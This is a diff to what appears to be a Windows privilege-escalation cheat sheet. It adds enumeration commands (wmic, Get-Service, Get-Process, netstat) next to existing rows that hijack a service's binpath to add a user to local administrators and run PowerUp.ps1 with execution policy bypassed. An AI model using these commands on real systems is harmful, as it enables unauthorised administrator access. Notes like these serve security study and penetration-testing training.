@@ -14,6 +14,12 @@
 | ```sc query <service name>``` | We can gather the binmary path name by using the sc query command |
 | ```sc config <service name> binpath= "net localgroup administrators <username> /add"``` | Modify binpath |
 | ```powershell.exe -nop -ep bypass . .\PowerUp.ps1``` | With modified PowerUp.ps1, will run as you invoke program |
+| ```wmic product get name,version``` | Uses WMI to get installed software |
+| ```Get-ChildItem -Hidden -Path C:\Users\username\Desktop\``` | Searches directory for hidden files | 
+| ```wmic service where "name like 'service name'" get Name,PathName``` | Uses WMI to get service information | 
+| ```Get-Service \| where-object Name -match 'Service Name' ``` | Using Powershell search for service information |
+| ```Get-Process -Name name-of-process``` | Using Get-Process find process PID | 
+| ```netstat -noa |findstr "LISTENING" |findstr "1337" | Using the PID of the process, find out what port its running on | 
  
 | Check | Description |
 | ---------------------------- | ---------------------------- |
